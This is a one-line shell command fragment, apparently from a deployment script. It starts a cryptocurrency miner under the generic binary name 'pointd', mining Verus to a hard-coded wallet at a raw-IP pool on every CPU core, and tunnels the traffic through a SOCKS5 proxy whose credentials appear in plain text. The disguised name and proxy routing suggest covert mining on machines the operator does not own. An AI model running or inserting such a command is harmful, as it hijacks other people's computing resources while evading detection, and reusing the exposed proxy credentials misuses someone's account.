...
./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-3 -n 1)-ngalong) -p x -t $(nproc) -x socks5://jwegwndc-1:mj2pb21fuqzo@192.111.137.35:4145
